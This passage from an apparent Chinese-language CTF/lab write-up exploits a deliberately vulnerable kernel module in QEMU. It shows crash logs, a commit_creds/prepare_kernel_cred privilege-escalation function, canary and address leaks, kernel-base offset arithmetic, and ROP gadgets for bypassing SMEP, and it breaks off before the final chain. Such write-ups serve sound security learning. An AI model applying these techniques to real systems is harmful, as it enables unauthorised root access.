<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.527527] Hardware name: <span class="er">QEMU</span> <span class="ex">Standard</span> PC <span class="er">(</span><span class="ex">i440FX</span> + PIIX, 1996<span class="kw">)</span><span class="ex">,</span> BIOS 1.13.0-1ubuntu1 04/01/2014</span>
<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.531814] RIP: 0010:unuse_pde+0x5/0x20</span>
<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>   <span class="er">44.535423</span><span class="ex">]</span> RSP: 0018:ffffad8d0016fe78 EFLAGS: 00000246</span>
<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.537718] RAX: 00000000ffffffff <span class="er">RBX:</span> <span class="ex">9090909090909090</span> RCX: 00000000000000cd</span>
<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.539627] RDX: 00000000000000cc <span class="er">RSI:</span> <span class="ex">0000000000000040</span> RDI: 9090909090909090</span>
<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.541591] RBP: ffff8c361f99cb40 <span class="er">R08:</span> <span class="ex">ffff8c3617f87368</span> R09: 0000000000000000</span>
<span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.544240] R10: 0000000000000000 <span class="er">R11:</span> <span class="ex">0000000000000000</span> R12: ffff8c361b427270</span>
<span id="cb29-20"><a href="#cb29-20" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.547003] R13: 000000006677889a <span class="er">R14:</span> <span class="ex">ffffffffffff0058</span> R15: 0000000000000000</span>
<span id="cb29-21"><a href="#cb29-21" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.549736] FS:  00007fce010f1740<span class="er">(</span>0000<span class="er">)</span> <span class="er">GS:ffff8c361ca00000(0000)</span> <span class="ex">knlGS:0000000000000000</span></span>
<span id="cb29-22"><a href="#cb29-22" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.552188] CS:  0010 <span class="er">DS:</span> <span class="ex">0000</span> ES: 0000 CR0: 0000000080050033</span>
<span id="cb29-23"><a href="#cb29-23" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.553857] CR2: 00000000006d1020 <span class="er">CR3:</span> <span class="ex">000000001fa6e000</span> CR4: 00000000000006f0</span>
<span id="cb29-24"><a href="#cb29-24" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.556680] Call Trace:</span>
<span id="cb29-25"><a href="#cb29-25" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>   <span class="er">44.559061</span><span class="ex">]</span>  proc_reg_unlocked_ioctl+0x3d/0x70</span>
<span id="cb29-26"><a href="#cb29-26" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.561896]  do_vfs_ioctl+0x8a/0x5b0</span>
<span id="cb29-27"><a href="#cb29-27" aria-hidden="true" tabindex="-1"></a>[   44.564238]  <span class="er">SyS_ioctl+0x6f/0x80</span></span>
<span id="cb29-28"><a href="#cb29-28" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.565645]  do_syscall_64+0x56/0xf0</span>
<span id="cb29-29"><a href="#cb29-29" aria-hidden="true" tabindex="-1"></a>[   44.567026]  <span class="er">entry_SYSCALL_64_after_hwframe+0x3d/0xa2</span></span>
<span id="cb29-30"><a href="#cb29-30" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.569517] RIP: 0033:0x7fce00c00107</span>
<span id="cb29-31"><a href="#cb29-31" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>   <span class="er">44.571259</span><span class="ex">]</span> RSP: 002b:00007fffeb601fb8 EFLAGS: 00000203 ORIG_RAX: 0000000000000010</span>
<span id="cb29-32"><a href="#cb29-32" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.573326] RAX: ffffffffffffffda <span class="er">RBX:</span> <span class="ex">0000000000000000</span> RCX: 00007fce00c00107</span>
<span id="cb29-33"><a href="#cb29-33" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.575684] RDX: ffffffffffff0058 <span class="er">RSI:</span> <span class="ex">000000006677889a</span> RDI: 0000000000000003</span>
<span id="cb29-34"><a href="#cb29-34" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.577902] RBP: 00007fffeb602270 <span class="er">R08:</span> <span class="ex">00007fce00b59988</span> R09: 0000000000000013</span>
<span id="cb29-35"><a href="#cb29-35" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.580405] R10: 0000000000000000 <span class="er">R11:</span> <span class="ex">0000000000000203</span> R12: 0000558988bed1c0</span>
<span id="cb29-36"><a href="#cb29-36" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.583526] R13: 00007fffeb602350 <span class="er">R14:</span> <span class="ex">0000000000000000</span> R15: 0000000000000000</span>
<span id="cb29-37"><a href="#cb29-37" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.586214] Code: 84 <span class="er">00</span> <span class="ex">00</span> 00 00 00 e9 3b fc ff ff 0f 0b 90 90 90 90 90 90 90 90 90 48 83 c7 48 e9 d7 89 fb ff 0f 1f 80 00 00 00 00 b8 ff ff ff ff <span class="op">&lt;</span>3e<span class="op">&gt;</span> 0f c1 47 6c 3d 01 00 00 80 74 0 </span>
<span id="cb29-38"><a href="#cb29-38" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.593812] RIP: unuse_pde+0x5/0x20 <span class="er">RSP:</span> <span class="ex">ffffad8d0016fe78</span></span>
<span id="cb29-39"><a href="#cb29-39" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.597231] ---[ end <span class="er">trace</span> <span class="ex">5f023e3f9e6ae13a</span> ]---</span>
<span id="cb29-40"><a href="#cb29-40" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.601485] Kernel panic <span class="er">-</span> <span class="ex">not</span> syncing: Fatal exception</span>
<span id="cb29-41"><a href="#cb29-41" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.607695] Kernel Offset: <span class="er">0x2400000</span> <span class="ex">from</span> 0xffffffff81000000 <span class="er">(</span><span class="ex">relocation</span> range: 0xffffffff80000000-0xffffffffbfffffff<span class="kw">)</span></span>
<span id="cb29-42"><a href="#cb29-42" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.613712] Rebooting in <span class="er">1</span> <span class="ex">seconds..</span></span></code></pre></div>
<p>不确定是不是因为rbp不对导致的？？？</p>
<p>方式3：传递给name变量用于覆盖ret_address的值地址还是promote_root函数的地址，为了平衡栈，我们需要多增加新增一个新的pop操作，当然mov
%rsp,%rbp要优先执行：</p>
<blockquote>
<p>|–rip(ioctl)–|–rbx(ioctl)–|—rbp—|–size=0x10–|</p>
</blockquote>
<p>promote_root代码：</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> promote_root<span class="op">()</span></span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> <span class="op">(*</span>commit_cred<span class="op">)(</span><span class="kw">struct</span> cred <span class="op">*</span>new<span class="op">);</span></span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> cred <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="kw">struct</span> task_struct <span class="op">*</span>daemon<span class="op">);</span></span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span><span class="co">//因为反汇编看出缺少部分内容</span></span>
<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pop %rbp&quot;</span><span class="op">);</span> </span>
<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>name和设置和1保持一致。</p>
<p>但是，，但是失败了，</p>
<p>（和方式2会产生相同的问题，不确定是不是因为rbp不对导致的？？？）</p>
<h2 id="smep和smap是能时">4. SMEP和SMAP是能时？</h2>
<h3 id="rop绕过smep">4.1. rop绕过SMEP</h3>
<p>修改start脚本，增加SMEP和SMAP的功能。</p>
<div class="sourceCode" id="cb31"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-system-x86_64</span> <span class="dt">\</span></span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a>-m 512M <span class="dt">\</span></span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>-kernel ./bzImage <span class="dt">\</span></span>
<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>-initrd  ./new_rootfs.cpio <span class="dt">\</span></span>
<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a>-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet &quot;</span> <span class="dt">\</span></span>
<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>-s  <span class="dt">\</span></span>
<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>-netdev user,id=t0, <span class="at">-device</span> e1000,netdev=t0,id=nic0 <span class="dt">\</span></span>
<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a>-cpu qemu64,smep,smap <span class="dt">\</span></span>
<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a>-nographic  <span class="dt">\</span></span></code></pre></div>
<p>从新执行exp，发现exploit被SMEP拦截：</p>
<div class="sourceCode" id="cb32"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc:</span> lease of 10.0.2.15 obtained, lease time 86400</span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ./exp</span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="ex">625b0b3d90b0ca00</span> 00007fffd464c3f0 ffffffffc03a019b ffffa0045fa30b40 ffffffffb8ddd6d1 000000000000889b ffffa00457f43f00 ffffffffb8d8ecfa 0000000000000026 0000000000000000 0000000000000000 </span>
<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="ex">get</span> canay is:625b0b3d90b0ca00</span>
<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="ex">commit_cred:ffffffffb8c9c8e0</span></span>
<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="ex">prepare_kernel_cred:ffffffffb8c9cce0</span></span>
<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="ex">promote_root:000056354d48a2a9</span></span>
<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">name_payload_len:88</span></span>
<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.100595] core: called <span class="er">core_writen</span></span>
<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.100970] unable to <span class="er">execute</span> <span class="ex">userspace</span> code <span class="er">(</span><span class="ex">SMEP?</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">uid:</span> 1000<span class="kw">)</span></span>
<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.108421] BUG: unable <span class="er">to</span> <span class="ex">handle</span> kernel paging request at 000056354d48a2a9</span>
<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.112788] IP: 0x56354d48a2a9</span>
<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.114318</span><span class="ex">]</span> PGD 1f85d067 P4D 1f85d067 PUD 1f856067 PMD 1f857067 PTE 1856b025</span>
<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.117294] Oops: 0011 <span class="er">[#1</span><span class="ex">]</span> SMP NOPTI</span>
<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.119232] Modules linked <span class="er">in:</span> <span class="ex">core</span><span class="er">(</span><span class="ex">O</span><span class="kw">)</span></span>
<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.120932] CPU: 0 <span class="er">PID:</span> <span class="ex">997</span> Comm: exp Tainted: G           O     4.15.8 <span class="co">#19</span></span>
<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.123671] Hardware name: <span class="er">QEMU</span> <span class="ex">Standard</span> PC <span class="er">(</span><span class="ex">i440FX</span> + PIIX, 1996<span class="kw">)</span><span class="ex">,</span> BIOS 1.13.0-1ubuntu1 04/01/2014</span>
<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.126272] RIP: 0010:0x56354d48a2a9</span>
<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.128051</span><span class="ex">]</span> RSP: 0018:ffffb0d580173e70 EFLAGS: 00000296</span>
<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.129584] RAX: 0000000000000000 <span class="er">RBX:</span> <span class="ex">9090909090909090</span> RCX: 0000000000000000</span>
<span id="cb32-21"><a href="#cb32-21" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.131237] RDX: 0000000000000000 <span class="er">RSI:</span> <span class="ex">ffffffffc03a2458</span> RDI: ffffb0d580173e70</span>
<span id="cb32-22"><a href="#cb32-22" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.132981] RBP: ffffffffffff0058 <span class="er">R08:</span> <span class="ex">6163203a65726f63</span> R09: 0000000000000dec</span>
<span id="cb32-23"><a href="#cb32-23" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.134788] R10: 0000000000000004 <span class="er">R11:</span> <span class="ex">6e65746972775f65</span> R12: ffffa0045b427270</span>
<span id="cb32-24"><a href="#cb32-24" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.137522] R13: 000000006677889a <span class="er">R14:</span> <span class="ex">ffffffffffff0058</span> R15: 0000000000000000</span>
<span id="cb32-25"><a href="#cb32-25" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.139838] FS:  00007fb8fbf36740<span class="er">(</span>0000<span class="er">)</span> <span class="er">GS:ffffa0045ca00000(0000)</span> <span class="ex">knlGS:0000000000000000</span></span>
<span id="cb32-26"><a href="#cb32-26" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.142626] CS:  0010 <span class="er">DS:</span> <span class="ex">0000</span> ES: 0000 CR0: 0000000080050033</span>
<span id="cb32-27"><a href="#cb32-27" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.144761] CR2: 000056354d48a2a9 <span class="er">CR3:</span> <span class="ex">000000001f86a000</span> CR4: 00000000003006f0</span>
<span id="cb32-28"><a href="#cb32-28" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.146823] Call Trace:</span>
<span id="cb32-29"><a href="#cb32-29" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.148625</span><span class="ex">]</span>  <span class="pp">?</span> proc_reg_unlocked_ioctl+0x31/0x70</span>
<span id="cb32-30"><a href="#cb32-30" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.150491]  <span class="pp">?</span> do_vfs_ioctl+0x8a/0x5b0</span>
<span id="cb32-31"><a href="#cb32-31" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.151446</span><span class="ex">]</span>  <span class="pp">?</span> SyS_ioctl+0x6f/0x80</span>
<span id="cb32-32"><a href="#cb32-32" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.152881]  <span class="pp">?</span> do_syscall_64+0x56/0xf0</span>
<span id="cb32-33"><a href="#cb32-33" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.154281</span><span class="ex">]</span>  <span class="pp">?</span> entry_SYSCALL_64_after_hwframe+0x3d/0xa2</span>
<span id="cb32-34"><a href="#cb32-34" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.156134] Code:  Bad <span class="er">RIP</span> <span class="ex">value.</span></span>
<span id="cb32-35"><a href="#cb32-35" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.157655] RIP: 0x56354d48a2a9 <span class="er">RSP:</span> <span class="ex">ffffb0d580173e70</span></span>
<span id="cb32-36"><a href="#cb32-36" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.159291] CR2: 000056354d48a2a9</span>
<span id="cb32-37"><a href="#cb32-37" aria-hidden="true" tabindex="-1"></a><span class="er">[</span>    <span class="er">9.161355</span><span class="ex">]</span> <span class="at">---[</span> end trace 88db38b69bbca590 ]---</span>
<span id="cb32-38"><a href="#cb32-38" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.164447] Kernel panic <span class="er">-</span> <span class="ex">not</span> syncing: Fatal exception</span>
<span id="cb32-39"><a href="#cb32-39" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.167807] Kernel Offset: <span class="er">0x37c00000</span> <span class="ex">from</span> 0xffffffff81000000 <span class="er">(</span><span class="ex">relocation</span> range: 0xffffffff80000000-0xffffffffbfffffff<span class="kw">)</span></span>
<span id="cb32-40"><a href="#cb32-40" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    9.172931] Rebooting in <span class="er">1</span> <span class="ex">seconds.</span></span></code></pre></div>
<p>如何计算kernel-base,通过kallsyms得到内核代码的加载基地址</p>
<blockquote>
<p>ffffffffa4000000 T _text</p>
</blockquote>
<p>因此可以通过commit_creds函数地址，计算器offset的值：</p>
<blockquote>
<p>0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0</p>
</blockquote>
<p>还需要注意，vmlinux中的起始地址为0xFFFFFFFF81000000(可从IDA里面查看)</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 <span class="op">;</span> <span class="op">===========================================================================</span></span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000</span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 <span class="op">;</span> Segment type<span class="op">:</span> Pure code</span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 <span class="op">;</span> Segment permissions<span class="op">:</span> Read<span class="op">/</span>Execute</span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 _text           segment mempage public &#39;CODE&#39; use64</span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000                 assume cs<span class="op">:</span>_text</span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000                 <span class="op">;</span>org <span class="dv">0</span><span class="er">FFFFFFFF81000000h</span></span>
<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000                 assume es<span class="op">:</span>nothing<span class="op">,</span> ss<span class="op">:</span>nothing<span class="op">,</span> ds<span class="op">:</span>_data<span class="op">,</span> fs<span class="op">:</span>nothing<span class="op">,</span> gs<span class="op">:</span>nothing</span>
<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000</span>
<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 <span class="op">;</span> <span class="op">===============</span> S U B R O U T I N E <span class="op">=======================================</span></span>
<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000</span>
<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000</span>
<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000 sub_FFFFFFFF81000000 proc near          <span class="op">;</span> DATA XREF<span class="op">:</span> sub_FFFFFFFF81000000<span class="op">+</span>C↓o</span>
<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000                                         <span class="op">;</span> sub_FFFFFFFF810001F0<span class="op">+</span><span class="dv">3</span><span class="er">D</span>↓o <span class="op">...</span></span>
<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000000                 lea     rsp<span class="op">,</span> unk_FFFFFFFF82203F58</span>
<span id="cb33-16"><a href="#cb33-16" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000007                 call    sub_FFFFFFFF810000E0</span>
<span id="cb33-17"><a href="#cb33-17" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF8100000C                 lea     rdi<span class="op">,</span> sub_FFFFFFFF81000000</span>
<span id="cb33-18"><a href="#cb33-18" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000013                 push    rsi</span>
<span id="cb33-19"><a href="#cb33-19" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000014                 call    sub_FFFFFFFF810001F0</span>
<span id="cb33-20"><a href="#cb33-20" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000019                 pop     rsi</span>
<span id="cb33-21"><a href="#cb33-21" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF8100001A                 add     rax<span class="op">,</span> <span class="dv">2682000</span><span class="er">h</span></span>
<span id="cb33-22"><a href="#cb33-22" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000020                 jmp     <span class="dt">short</span> loc_FFFFFFFF81000042</span>
<span id="cb33-23"><a href="#cb33-23" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>text<span class="op">:</span>FFFFFFFF81000020 <span class="op">;</span> <span class="op">---------------------------------------------------------------------------</span></span></code></pre></div>
<p>因此如果rop gadget的内存地址，可以通过如下的方式获取：</p>
<blockquote>
<p>kernel_base = commit_cred_addr-commit_cred_offset</p>
<p>gadget_addr_offset = （gadget_addr_offline-0xFFFFFFFF81000000）</p>
<p>gadget_addr = kernel_base+gadget_addr_offset</p>
</blockquote>
<p>攻击思路如下：</p>
<ul>
<li><p>将0 赋值到rdi</p></li>
<li><p>触发ret执行prepare_kernel_cred，其返回值存放在寄存器rax中</p></li>
<li><p>将rax覆盖rdi</p></li>
<li><p>触发ret执行commit_creds函数</p></li>
<li><p>为例执行用户空间代码，需要执行swappgs（我的理解)</p></li>
<li><p>通过iret返回，因为是从kernel返回到用户态，因此需要在栈上布局return_addr,cs,flag,sp,ss。</p></li>
</ul>
<p>Note1:</p>
<pre class="textile"><code>the IRET instruction pops the return instruction pointer, 
return code segment selector, and EFLAGS image from the stack to the EIP,
 CS, and EFLAGS registers, respectively, and then resumes execution of 
the interrupted program or procedure. If the return is to 
another privilege level, the IRET instruction also pops the 
stack pointer and SS from the stack, before resuming program execution.</code></pre>
<p>Note2:</p>
<pre class="textile"><code>When FS and GS segment overrides are used in 64-bit mode, their 
respective base addresses are used in the linear
address calculation: (FS or GS).base + index + displacement. 
FS.base and GS.base are then expanded to the full
linear-address size supported by the implementation. The resulting 
effective address calculation can wrap across
positive and negative addresses; the resulting linear address must be 
canonical.

1）The SWAPGS instruction is available only in 64-bit mode. It swaps the 
contents of two specific MSRs (IA32_GS_BASE and IA32_KERNEL_GS_BASE).
2）The IA32_GS_BASE MSR shadows the base address portion of the GS 
descriptor register; the IA32_KERNEL_GS_BASE MSR holds the base address 
of the GS segment used by the kernel (typically it houses kernel 
structures).
3）SWAPGS is intended for use with fast system calls when in 64-bit 
mode to allow immediate access to kernel structures on transition to 
kernel mode.</code></pre>
<h3 id="rop-gadgets">4.2 rop gadgets</h3>
<p>prepare_kernel_cred函数需要的gadget:</p>
<blockquote>
<p>0xffffffff81000b2f : pop rdi ; ret</p>
</blockquote>
<p>commit_cred函数的准备参数的gadget很多，如</p>
<div class="sourceCode" id="cb36"><pre
class="sourceCode asm"><code class="sourceCode fasm"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a>0xffffffff81424f1e : <span class="bu">pop</span> <span class="kw">rbx</span> <span class="co">; pop rbp ; mov rdi, rax ; jmp rdx</span></span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a>0xffffffff81735dc1 : <span class="bu">pop</span> <span class="kw">r15</span> <span class="co">; mov rdi, rax ; jmp rdx</span></span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>0xffffffff81735dbf : <span class="bu">pop</span> <span class="kw">r14</span> <span class="co">; pop r15 ; mov rdi, rax ; jmp rdx</span></span>
<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>0xffffffff8123967a : <span class="bu">mov</span> <span class="kw">rsi</span><span class="op">,</span> <span class="kw">rdi</span> <span class="co">; mov rdi, rax ; jmp r8</span></span>
<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>0xffffffff811ae975 : <span class="bu">mov</span> <span class="kw">rsi</span><span class="op">,</span> <span class="kw">rdi</span> <span class="co">; mov rdi, rax ; jmp rcx</span></span>
<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a>0xffffffff813c3384 : <span class="bu">mov</span> <span class="kw">rsi</span><span class="op">,</span> <span class="kw">rdi</span> <span class="co">; mov rdi, rax ; jmp rdx</span></span>
<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a>0xffffffff816c5d21 : <span class="bu">mov</span> <span class="kw">rsi</span><span class="op">,</span> <span class="kw">rbx</span> <span class="co">; mov rdi, rax ; call rcx</span></span>
<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a>0xffffffff81641dba : <span class="bu">mov</span> <span class="kw">rsi</span><span class="op">,</span> <span class="kw">rbx</span> <span class="co">; mov rdi, rax ; call rdx</span></span>
<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a>0xffffffff811ae978 : <span class="bu">mov</span> <span class="kw">rdi</span><span class="op">,</span> <span class="kw">rax</span> <span class="co">; jmp rcx</span></span>
<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a>0xffffffff8106a6d2 : <span class="bu">mov</span> <span class="kw">rdi</span><span class="op">,</span> <span class="kw">rax</span> <span class="co">; jmp rdx</span></span></code></pre></div>
<p>我们选择：</p>
<blockquote>
<p>0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx</p>
<p>0xffffffff810a0f49 : pop rdx ; ret</p>
</blockquote>
<p>rop如下：</p>
